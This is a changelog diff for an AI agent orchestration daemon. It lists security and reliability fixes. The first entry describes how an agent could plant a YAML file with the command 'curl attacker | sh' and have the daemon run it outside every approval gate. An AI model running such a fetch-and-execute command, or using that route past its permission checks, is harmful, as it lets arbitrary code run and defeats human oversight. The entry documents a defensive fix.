@@ -2,6 +2,116 @@
 
 ## [Unreleased]
 
+### Fixed
+
+- **Security: eval-case probe no longer executes agent-writable YAML.**
+  `probe_evals` used to re-read and `sh -c` every `*.yaml` under the
+  attempt worktree's `.agentgrid/evals/` *after* the agent ran — but the
+  worktree is agent-mutable, so any agent (even under an approval-gated
+  adapter, with zero approved tool calls) could drop `evil.yaml` with
+  `command: curl attacker | sh` and have the daemon itself execute it in
+  its own context, outside every permission gate. The probe now runs only
+  the commands captured in daemon memory at materialisation time (when the
+  CP-stamped artifacts were fetched over the authenticated node API) and
+  re-reads each pinned file solely to verify its SHA-256 still matches: a
+  modified or deleted pinned case fails the suite (fail-closed), and
+  unlisted YAML files are logged and never parsed or executed. On an
+  unsandboxed node the eval child additionally gets a clean environment
+  (PATH/HOME only) instead of the daemon's inherited env — parity with
+  `ProcessBackend::spawn`'s long-standing hygiene; sandboxed nodes keep
+  inheritance (docker/systemd CLIs may need DOCKER_HOST/DBUS). New tests
+  cover tamper-fail, deleted-case-fail and unlisted-file-ignored.
+- **Build/MSRV made honest: the workspace did not compile outside floating
+  CI.** CI runs `stable` (whatever shipped that week), so it was green,
+  but the lockfile's real floor is rustc 1.94 (sqlx 0.9) — the declared
+  `rust-version = "1.85"` was fiction and any dev on an older toolchain
+  got an impenetrable resolver error (exactly what happened on the Windows
+  dev host: 1.86 could not even `cargo check`). Fixed by pinning
+  `rust-toolchain.toml` to 1.99.1 (every machine now compiles what CI
+  compiles), bumping `rust-version` to 1.94, dropping the portable job's
+  explicit `toolchain: stable` override so the pin wins, and adding an
+  `msrv` CI job that `cargo check`s the workspace on 1.94.0 so the claim
+  can never silently rot again (verified locally: full workspace
+  `--all-targets` check passes on 1.94.0).
+- **Node event hot path no longer fsyncs on the async runtime.**
+  `EventSink::push`/`flush`/`drain_outbox` called `EventOutbox`
+  `push`/`ack`/`pending` inline — std file I/O, per-append `sync_data`
+  and ack's full-file rewrite+rename executed on Tokio workers. One
+  struggling disk stalled every concurrent attempt's flush, the WS control
+  channel and the heartbeat (git and heartbeat scans were already
+  `spawn_blocking`; the event path was the one gap). All three now run
+  via `spawn_blocking` wrappers.
+- **Node WS session heals half-open connections.** `run_session` selected
+  on `hb.tick()` and an unbounded `sock.next()`: a NAT drop / partition
+  left the session parked on a never-resolving read (and an unbounded
+  heartbeat send on a full buffer) until TCP itself gave up many minutes
+  later — Cancel/ConfigUpdate stalled the whole time. Reads are now
+  bounded by a 90 s idle timeout (3× the heartbeat interval; the CP pings
+  every ~15 s) and heartbeat writes by 15 s; the reconnect loop takes
+  over from there.
+- **Timeout-less HTTP clients bounded.** `notify_task`'s webhook client
+  and the ACP gateway's CP client were `reqwest::Client::new()` — no
+  timeout, the exact pitfall `polling.rs` documents for the daemon
+  client. A black-holed webhook accumulated one parked task+connection
+  per terminal task event; a hung CP POST parked the 1 s-poll
+  `session_prompt` loop and permission relay forever. Now 10 s connect +
+  15 s total (notify) and 10 s connect + 30 s total (ACP gateway).
+- **ACP gateway session map no longer leaks.** `sessions` entries were
+  only removed on `session_cancel`, so clients that opened sessions and
+  vanished leaked a `SessionMeta` each for the process lifetime; they now
+  carry a last-used stamp and are reaped after 24 h (same pattern as the
+  existing `asked` TTL sweep).
+- **Startup recovery is O(n) over the completion outbox** instead of
+  O(n²): each `redeliver_completion` re-read and re-parsed the whole
+  `completions.jsonl`, and startup called it per pending record. The
+  send/ack logic moved into `deliver_completion`; startup makes one
+  `pending()` pass, the per-id path (dispatch_batch) delegates unchanged.
+- **Byte-slice panics on non-ASCII ids** (both server-provided): the
+  Telegram approval formatter's `&task[..8]` and the CP notification
+  `chat_text`'s `&task_id[..8]` now truncate on char boundaries.
+- **Telegram gateway URL path segments percent-encoded.** `/show`,
+  `/cancel`, `/logs`, `/allow`, `/deny` ids and conversation ids were
+  `format!`-ed into URLs raw — WHATWG normalization could turn a crafted
+  `../`-shaped id into an endpoint retarget under the gateway's admin
+  JWT. Only allowlisted chats reach these commands, but the ids are now
+  encoded regardless.
+- **Raw output mirror errors are no longer silent.** A disk-full on the
+  worktree's `agent-raw-output.log` mirror silently truncated the agent's
+  raw tail with no log line; the write now warns (the CP-visible event
+  stream was never affected).
+- **Two startup/teardown panics made honest:** the completion-outbox
+  double-fallback ends in an `expect` naming the real condition (neither
+  data dir nor temp dir writable) instead of a bare `unwrap`; the CP test
+  `AppState` Drop uses `to_string_lossy` so a non-UTF-8 temp path cannot
+  panic during teardown.
+
+- **Local-source validation cannot be fooled by a repo above the path.**
+  `validate_local_source` ran `git rev-parse --git-dir` with plain parent
+  discovery, so on any machine with a `.git` higher up the tree (a dotfiles
+  repo in `$HOME`, say) a plain non-repo directory passed "is a git
+  repository" and failed much later inside `clone --mirror` with a baffling
+  branch error. Both rev-parse and show-ref now set
+  `GIT_CEILING_DIRECTORIES` to the validated path's parent, pinning
+  discovery to the path itself. Found because the Windows dev host (HOME
+  is a repo) failed `local_path_validates_repo_and_branch` — the same
+  environment-sensitivity made `probe_cluster_adapter_reports_missing`
+  assert on `version.is_none()`, which legitimately holds only where
+  `sh --version` is quiet (dash); that assert is dropped, the deterministic
+  missing-executor one stays.
+- **Clippy 1.99 clean:** `manual_is_multiple_of` in the CP maintenance
+  loop (`tick % 4` → `tick.is_multiple_of(4)`) — first surfaced by the
+  pinned toolchain, which is exactly the point of pinning it.
+
+### Changed
+
+- **PR validation workflow supply-chain parity.** `pr-validation.yaml`
+  pinned its actions by tag (`trivy-action@master` worst of all) while
+  every other workflow pins SHAs; all actions there are now commit-SHA
+  pinned (reusing the SHAs already pinned elsewhere in the repo). The
+  `integration-tests` job's `postgres:15-alpine` service container is
+  removed — nothing in the workspace reads `DATABASE_URL` (the CP bundles
+  SQLite); it was dead weight from an early template.
+
 ## [0.5.1] - 2026-10-13
 
 ### Fixed
